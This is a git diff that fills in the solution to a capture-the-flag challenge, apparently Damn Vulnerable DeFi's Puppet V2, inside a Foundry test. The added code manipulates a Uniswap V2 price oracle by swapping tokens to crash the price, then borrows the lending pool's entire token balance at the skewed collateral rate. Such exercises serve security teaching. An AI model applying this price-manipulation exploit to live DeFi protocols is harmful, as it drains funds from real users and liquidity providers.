@@ -99,11 +99,25 @@ contract PuppetV2 is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
+    event log(uint256);
+
     function testExploit() public {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        dvt.approve(address(uniswapV2Router), ATTACKER_INITIAL_TOKEN_BALANCE);
+        address[] memory path = new address[](2);
+        path[0] = address(dvt);
+        path[1] = address(weth);
+        uniswapV2Router.swapExactTokensForETH(ATTACKER_INITIAL_TOKEN_BALANCE, 0, path, attacker, block.timestamp + 1);
+        uint256 amountToWrap = attacker.balance;
+        weth.deposit{value: amountToWrap}();
+        weth.approve(address(puppetV2Pool), amountToWrap);
+        emit log(puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE));
+        emit log(attacker.balance);
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
